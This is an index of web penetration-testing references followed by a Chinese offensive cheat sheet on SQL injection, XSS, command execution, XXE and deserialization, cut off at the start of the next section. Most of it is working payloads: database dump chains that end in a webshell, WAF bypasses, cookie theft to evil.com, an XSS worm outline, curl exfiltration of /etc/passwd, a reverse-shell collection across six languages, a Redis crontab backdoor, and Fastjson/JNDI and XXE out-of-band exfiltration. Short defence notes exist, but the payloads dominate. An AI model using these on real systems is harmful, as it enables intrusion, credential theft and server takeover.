# 03 Web Security Integrated

This integrated file merges Web attack methodology, protocol-specific testing, business logic and auth issues, file and deployment issues, and the categorized Web wiki references into one navigation layer.

## Use This File When

- the target is primarily a Web application, API, gateway, or browser-facing service
- you need one place for injection, auth, logic, file, deployment, protocol, and modern Web attack families
- Burp replay is already stable and you are ready to test the server-side surface

## Topic Clusters

- injection families: SQLi, XSS, command execution, XXE, deserialization
- protocol and platform families: CORS, GraphQL, request smuggling, WebSocket, OAuth/OIDC
- logic and auth families: IDOR, privilege issues, payment logic, password reset, auth bypass
- file and infrastructure families: upload, traversal, inclusion, deployment, cache, CDN, cloud
- modern Web families from the merged wiki layer: JWT, CSRF, API, prototype pollution, framework flaws

## Recommended Read Path

1. Start with the source block that matches the dominant bug class.
2. If the target exposes mixed protocol behavior, read `web-modern-protocols.md` sections early.
3. If the target is auth- or workflow-heavy, read `web-logic-auth.md` before payload-heavy sections.
4. If the target involves upload, path traversal, static hosting, or CDN behavior, read `web-file-infra.md` and deployment sections.
5. Use the later merged wiki sections as breadth expansion after the main testing strategy is set.

## Best Entry Points By Scenario

- classic parameter fuzzing target: start at `web-injection.md`
- OAuth, CORS, GraphQL, WebSocket, or request smuggling target: start at `web-modern-protocols.md`
- IDOR, payment, reset flow, or auth target: start at `web-logic-auth.md`
- upload, include, traversal, static resource, or infra target: start at `web-file-infra.md`

## Boundary Rule

If the request cannot yet be reproduced outside the client, go back to `02-client-api-reverse-and-burp.md` first. Do not treat server testing guidance as a substitute for unfinished client recovery.

## Included Sources

- references\web-injection.md
- references\web-modern-protocols.md
- references\web-logic-auth.md
- references\web-file-infra.md
- references\web-deployment-security.md
- references\web-playbook-01-clickjacking.md
- references\web-playbook-02-supply-chain-attacks.md
- references\web-playbook-03-cache-and-cdn-security.md
- references\web-playbook-04-open-redirect.md
- references\web-playbook-05-framework-vulnerabilities.md
- references\web-playbook-06-request-smuggling.md
- references\web-playbook-07-authentication-vulnerabilities.md
- references\web-playbook-08-file-vulnerabilities.md
- references\web-playbook-09-business-logic-vulnerabilities.md
- references\web-playbook-10-prototype-pollution.md
- references\web-playbook-11-cloud-security-vulnerabilities.md
- references\web-playbook-12-ai-security.md
- references\web-playbook-13-api-security.md
- references\web-playbook-14-csrf-cross-site-request-forgery.md
- references\web-playbook-15-jwt-security.md
- references\web-playbook-16-lfi-rfi-file-inclusion.md
- references\web-playbook-17-rce-remote-code-execution.md
- references\web-playbook-18-sql-nosql-injection.md
- references\web-playbook-19-ssrf-server-side-request-forgery.md
- references\web-playbook-20-ssti-template-injection.md
- references\web-playbook-21-websocket-security.md
- references\web-playbook-22-xss-cross-site-scripting.md
- references\web-playbook-23-xxe-entity-injection.md
- references\web-playbook-index.md

---

## Source: web-injection.md

Path: references\web-injection.md

# Web注入安全

> 精炼自WooYun漏洞库三大注入类型知识库：SQL注入(27,732例)、XSS(7,532例)、命令执行(6,826例)
> 数据来源：wooyun_vulnerabilities.json (88,636条漏洞记录, 2010-2016)
> 本文档仅用于安全研究与防御参考

---

## 一、SQL注入

### 1.1 漏洞本质

```
输入验证缺失 → 动态SQL拼接 → 语义边界突破 → 数据库指令执行
```

**核心公式**：SQL注入 = 代码与数据边界混淆 + 用户输入提升为可执行SQL指令

### 1.2 检测方法

#### 高危注入点识别

| 向量类型 | 占比 | 典型场景 |
|---------|------|---------|
| 登录框 | 66% | 用户名/密码直接拼接 |
| 搜索框 | 64% | LIKE语句模糊匹配 |
| POST参数 | 60% | 表单提交 |
| HTTP头 | 26% | UA/Referer/XFF |
| GET参数 | 24% | URL参数 |
| Cookie | 12% | 会话标识处理 |

**高频参数名**：`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`；ASP.NET特有：`__viewstate`, `__eventvalidation`

#### 快速检测流程

```
1. 单引号/双引号测试 → 观察报错
2. 数学运算: id=2-1 / id=1*1 → 观察等价性
3. 布尔测试: and 1=1 / and 1=2 → 对比响应差异
4. 时间延迟: and sleep(5) → 观察响应时间
5. 排序探列: order by N → 递增至报错
```

#### 数据库指纹识别

| 数据库 | 延迟函数 | 系统表 | 错误特征 |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | 笛卡尔积延迟 | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 注入技术与Payload

#### 布尔盲注

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### 时间盲注

```sql
-- MySQL（嵌套延迟实战技巧）
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### 联合查询

```sql
id=1 ORDER BY N--              -- 探列数
id=-1 UNION SELECT 1,2,3,4,5--  -- 确定回显位
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### 报错注入

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHAR函数绕过字符过滤
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/过滤绕过技巧

#### 内联注释（最常用）

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMS绕过实例
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### 编码绕过

```sql
-- 十六进制: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URL双重编码: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### 大小写 + 空白符替换

```sql
UnIoN SeLeCt                    -- 大小写混淆
UNION/**/SELECT/**/1,2,3        -- 注释替代空格
UNION%09SELECT                  -- Tab替代
UNION%0ASELECT                  -- 换行替代
```

#### 函数替代

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> 字符A
```

#### 逻辑等价替换

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- 引号绕过
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### 宽字节注入（GBK编码）

```
%bf%27 绕过 addslashes()   -- GBK下多字节字符吞掉反斜杠
```

#### HTTP层绕过

```
参数污染: id=1&id=2             -- 重复参数混淆
分块传输: Transfer-Encoding: chunked
X-Forwarded-For注入 / Cookie注入  -- 非常规注入点
```

### 1.5 利用链

#### MySQL完整利用链

```sql
-- 1.信息 -> 2.库 -> 3.表 -> 4.列 -> 5.数据 -> 6.文件 -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL完整利用链

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- 命令执行（需sa权限）
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracle利用链

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Access盲注利用链

```sql
-- 无information_schema，需获取源码或猜表名
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- 多用户枚举用NOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 防御措施

```python
# 参数化查询（首选）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- 参数化查询/预编译语句（首选）、存储过程（次选）
- 白名单输入验证 + 数字型参数强制类型转换
- 数据库最小权限 + 错误信息隐藏 + WAF部署

---

## 二、XSS跨站脚本

### 2.1 漏洞本质

```
用户输入(数据) -> 未编码输出 -> 浏览器解析为代码 -> 脚本执行
```

**核心公式**：XSS = 信任边界突破 + 输出上下文混淆（数据在HTML/JS/CSS/URL中语义变化）

### 2.2 检测方法

#### 高危输出点

| 输出点 | 触发条件 | 典型场景 |
|-------|---------|---------|
| 用户昵称/签名 | 页面加载 | 个人主页、评论、好友列表 |
| 搜索框回显 | 搜索操作 | 搜索结果页 |
| 评论/留言 | 内容展示 | 论坛、博客、商品评价 |
| 文件名/描述 | 文件列表 | 网盘、相册 |
| 邮件正文/标题 | 打开邮件 | 邮箱系统 |
| 订单备注 | 后台查看 | 电商后台、工单系统 |

**隐蔽输出点**（易遗漏）：HTTP头(XFF/UA写入日志)、WAP提交PC展示、客户端昵称Web渲染、草稿箱/审核列表

#### 上下文快速判断

```
输出在 <script> 内？ -> JS上下文（检查引号类型）
输出在属性值中？    -> 属性上下文（检查属性类型）
输出在标签内容中？  -> HTML上下文（检查特殊标签textarea/title）
输出在URL中？       -> URL上下文（检查协议限制）
输出在CSS中？       -> CSS上下文（检查expression支持）
```

### 2.3 上下文Payload

#### HTML标签内容

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTML属性值

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScript字符串

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL上下文

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/过滤绕过技巧

#### 编码绕过

```html
<!-- HTML实体 -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + data协议 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSS编码(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### 标签/属性变形

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- 大小写混淆 -->
<script/src=//xss.com/x.js>            <!-- 斜杠替代空格 -->
<img src=x onerror=alert(1)>           <!-- 无引号 -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- 双写绕过 -->
<scr\x00ipt>alert(1)</script>          <!-- 空字符绕过 -->
```

#### 替代事件处理器

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF特定绕过

```html
.<script src=http://localhost/1.js>.    <!-- 安全宝：前后加点号 -->
<!--[if true]><img onerror=alert(1) src=--> <!-- 注释干扰 -->
```

#### 长度限制绕过

```html
<script src=//xss.pw/j>                <!-- 最短外部加载 -->
<!-- DOM拼接 -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- 字符串拼接绕过关键字 -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly绕过

- Flash接口获取用户信息替代Cookie
- 转为CSRF方式：直接执行敏感操作（改密码、加管理员、读token）

### 2.5 利用链

#### Cookie窃取

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSS关键源与汇

**危险源**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**危险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSS蠕虫核心逻辑

```javascript
// 1.获取当前用户身份(cookie/token)
// 2.构造包含自身payload的内容
// 3.自动发布/分享（AJAX POST）
// 4.触发条件：查看/访问即传播
function worm(){
    jQuery.post("/api/post", {"content": "<自传播payload>"})
}
worm()
```

#### 组合利用模式

```
XSS + CSRF -> 获取Token执行管理操作
XSS + SQLi -> 盲打获取Cookie -> 后台注入
XSS -> 账号劫持 -> 权限提升 -> 蠕虫传播
XSS盲打(留言/工单/反馈) -> 获取后台管理员Cookie
```

### 2.6 防御措施

- **输出编码**（核心）：HTML上下文用HTML实体，JS上下文用JS编码，URL上下文用URL编码
- CSP策略限制脚本来源
- HTTPOnly保护Cookie
- 白名单输入验证（避免黑名单，总有遗漏）
- **常见失误**：只过滤script标签、只过滤小写、前端过滤可抓包绕过、单次过滤被双写绕过

---

## 三、命令执行

### 3.1 漏洞本质

```
用户输入(数据) -> 未净化拼接 -> 进入系统命令/代码执行上下文 -> OS指令执行
```

**核心公式**：命令执行 = 数据流污染 + 执行上下文（Shell/代码/表达式）

### 3.2 检测方法

#### 高频入口点

| 入口类型 | 占比 | 典型场景 |
|---------|------|---------|
| 文件操作 | 68% | 上传、读取、解压 |
| 系统命令函数 | 62% | exec/system/shell_exec |
| Struts2框架 | 50% | OGNL表达式注入 |
| SSRF | 30% | URL参数传递 |
| ping命令 | 26% | 网络诊断功能 |
| 图片处理 | 24% | ImageMagick |
| Java反序列化 | 20% | WebLogic/JBoss |

#### 命令拼接符号

| 符号 | 含义 | 执行逻辑 |
|------|------|---------|
| `;` | 分隔符 | 顺序执行，不管前命令结果 |
| `\|` | 管道 | 前输出作为后输入 |
| `` ` `` / `$()` | 命令替换 | 执行内部命令并返回结果 |
| `\|\|` | 逻辑或 | 前失败才执行后 |
| `&&` | 逻辑与 | 前成功才执行后 |
| `%0a` / `%0d%0a` | 换行 | URL编码换行分隔 |

#### 无回显检测

```bash
# DNSLog外带
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTP外带
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# 时间延迟
sleep 5
ping -c 5 127.0.0.1

# 文件写入Web目录
echo "test" > /var/www/html/proof.txt
```

### 3.3 绕过技巧

#### 空格绕过

```bash
cat${IFS}/etc/passwd          # ${IFS}内部字段分隔符
cat$IFS$9/etc/passwd          # $9为空的位置参数
cat%09/etc/passwd             # Tab制表符
cat</etc/passwd               # 重定向符
{cat,/etc/passwd}             # 大括号扩展
```

#### 关键字绕过

```bash
# 引号/反斜杠分割
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# 变量拼接
a=c;b=at;$a$b /etc/passwd

# 通配符
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### cat命令替代

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### 编码绕过

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 利用链与Payload

#### 框架/组件漏洞Payload

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL通用命令执行**：

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovy沙箱绕过**：

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Redis未授权写SSH公钥/Crontab**：

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# 或写crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### 反弹Shell集合

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC无-e参数
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHP危险函数层级

| 层级 | 函数 | 能力 |
|-----|------|-----|
| L1代码级 | `eval()`, `assert()(PHP5)`, `create_function()`, `preg_replace(/e)` | PHP代码执行 |
| L2 Shell级 | `system()`, `passthru()`, `shell_exec()`, 反引号 | 系统命令有回显 |
| L3进程级 | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | 子进程执行 |
| L4回调级 | `call_user_func()`, `array_map()` | 间接函数调用 |

#### PHP WAF绕过技巧

```php
// 字符串拼接
$func = 'sys'.'tem'; $func('whoami');
// 变量函数
$a='sys';$b='tem';($a.$b)('whoami');
// 编码混淆
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// 字符串操作
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functions绕过

| 方法 | 原理 | 条件 |
|-----|------|-----|
| LD_PRELOAD | 劫持系统库函数，mail()触发加载恶意.so | 可上传.so + mail()可用 |
| Shellshock | Bash<=4.3环境变量注入 | 旧版Bash |
| Apache Mod_CGI | .htaccess配置CGI执行 | Apache + AllowOverride |
| PHP-FPM/FastCGI | 修改PHP配置执行代码 | 可访问FPM端口/SSRF |
| ImageMagick | delegate功能命令执行 | 使用IM处理图片 |
| Windows COM | WScript.Shell组件 | Windows + COM扩展 |

**LD_PRELOAD核心利用**：

```php
// 上传恶意.so（劫持geteuid函数，内部调用system()）
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail()启动sendmail进程 -> 加载.so -> 执行命令
```

### 3.5 防御措施

```php
// 最佳实践：白名单验证 + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- 避免直接调用系统命令，使用语言内置函数替代
- 参数化执行（数组传参），禁止字符串拼接
- `escapeshellarg()` + `escapeshellcmd()` 转义
- 白名单验证输入 + 类型检查
- `disable_functions` 禁用危险函数（注意绕过风险）
- 最小权限运行Web服务 + 容器/chroot隔离
- 及时更新框架组件（Struts2/WebLogic/ImageMagick等）

---

## 四、XXE (XML外部实体注入)

### 4.1 漏洞本质

```
XML输入 -> 解析器启用DTD/外部实体 -> 实体引用被解析执行 -> 文件读取/SSRF/RCE
```

**核心公式**：XXE = XML解析器允许外部实体引用 + 用户可控XML输入

### 4.2 检测方法

**高危入口点识别**

| 入口类型 | 检测特征 | 典型场景 |
|----------|----------|----------|
| API接口 | Content-Type含`text/xml`或`application/xml` | RESTful API、SOAP Web服务 |
| 文件上传 | SVG图片、DOCX/XLSX/PPTX(本质ZIP含XML) | 头像上传、文档导入 |
| 数据解析 | XML配置导入、RSS/Atom订阅 | 后台管理、聚合功能 |
| 协议交互 | SAML认证、WebDAV、XMPP | SSO登录、文件管理 |

**快速检测流程**

```
1. 识别XML处理接口 → 修改Content-Type为application/xml测试
2. 发送基础DTD声明 → 观察是否解析(报错差异)
3. 尝试外部实体引用 → file协议读取已知文件
4. 无回显时 → OOB外带(DNS/HTTP回连)
```

### 4.3 经典Payload

#### 文件读取（有回显）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRF内网探测

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### 盲注 - OOB外带数据

```xml
<!-- 外部DTD (attacker服务器托管evil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtd内容: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### 报错回显

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 绕过技巧

| 绕过方式 | 方法 | 适用场景 |
|----------|------|----------|
| 编码绕过 | UTF-16BE/LE、UTF-7编码XML | WAF基于ASCII模式匹配 |
| 参数实体嵌套 | `%entity;`替代`&entity;` | 过滤通用实体`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | 无法控制DOCTYPE声明 |
| SVG嵌入 | SVG文件内嵌XXE实体 | 仅允许图片上传 |
| DOCX/XLSX嵌入 | 修改Office文档内`[Content_Types].xml` | 文档上传功能 |
| CDATA包裹 | 用CDATA段绕过特殊字符限制 | 读取含XML特殊字符的文件 |

### 4.5 防御措施

```java
// Java: 禁用DTD和外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- 禁用DTD处理和外部实体解析（首选）
- 使用JSON替代XML进行数据交换
- 输入白名单校验、升级XML解析库
- WAF规则拦截`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`关键字

---

## 五、反序列化漏洞

### 5.1 漏洞本质

```
序列化数据(不可信) -> 反序列化函数 -> 对象重构触发魔术方法/回调 -> 恶意逻辑执行
```

**核心公式**：反序列化RCE = 可控序列化输入 + 危险类在classpath/作用域内 + 可达的利用链(Gadget Chain)

### 5.2 Java反序列化

**检测标识**

```
二进制流: AC ED 00 05 (hex头部)
Base64:   rO0AB (编码后头部)
常见位置: Cookie、ViewState、JMX、RMI、T3协议、HTTP Body
```

**利用链速查**

| 利用链 | 依赖库 | 触发方式 | 工具 |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | 手工/专用工具 |
| Jackson | jackson-databind | 多态反序列化 | ysoserial |
| JNDI注入 | JDK < 8u191 | LDAP/RMI远程类加载 | JNDIExploit/marshalsec |

**Fastjson经典Payload**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// 1.2.47 缓存绕过
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**工具链**

```bash
# ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# JNDI注入服务
java -jar JNDIExploit.jar -i attacker_ip

# marshalsec启动恶意LDAP/RMI
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 PHP反序列化

**检测标识**

```
格式: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
关键函数: unserialize(), phar://协议触发
```

**魔术方法利用链**

| 方法 | 触发时机 | 利用方式 |
|------|----------|----------|
| `__wakeup()` | unserialize()调用时 | 属性覆盖→危险操作 |
| `__destruct()` | 对象销毁时 | 文件删除/写入/命令执行 |
| `__toString()` | 对象被当字符串使用 | 拼接进危险函数 |
| `__call()` | 调用不存在的方法 | 链式调用跳板 |

**POP链构造思路**

```
1. 找入口: __wakeup()/__destruct() 中调用$this->xxx属性的方法
2. 跳板: 通过__toString()/__call()/__get() 链接到其他类
3. 终点: 到达system()/eval()/file_put_contents()等危险函数
4. 构造: 控制属性值使链路完整连通
```

**Phar反序列化（无需unserialize调用）**

```php
// 文件操作函数触发phar://反序列化
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // 伪装为图片后缀
```

### 5.4 Python反序列化

**危险函数**

```python
import pickle, yaml, marshal

# pickle - 最常见
pickle.loads(data)      # 反序列化
pickle.load(file)       # 从文件反序列化

# yaml - 需要Loader
yaml.load(data)         # 默认不安全(旧版本)
yaml.load(data, Loader=yaml.FullLoader)  # 限制加载

# marshal - 字节码级别
marshal.loads(data)     # 加载代码对象
```

**pickle RCE Payload**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# 等价手工构造:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**yaml RCE Payload**

```yaml
!!python/object/apply:os.system ['whoami']
# 或
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 防御措施

```java
// Java: ObjectInputStream白名单过滤
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: 升级组件(Fastjson/Jackson/Commons-Collections)、关闭autoType、使用白名单反序列化过滤器
- **PHP**: 避免unserialize()处理用户输入、使用json_decode替代、禁用phar://协议
- **Python**: 使用`yaml.safe_load()`替代`yaml.load()`、禁止pickle处理不可信数据、使用JSON
- **通用**: 避免原生序列化格式传输数据，统一使用JSON；对反序列化入口做签名/HMAC校验

---

## 附录：SQLMap速查

```bash
# 基础检测
sqlmap -u "http://t/p.php?id=1" --batch
# POST请求
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTP头注入
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# 绕过WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# 数据提取链
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```


---

## Source: web-modern-protocols.md

Path: references\web-modern-protocols.md

# 现代Web协议安全

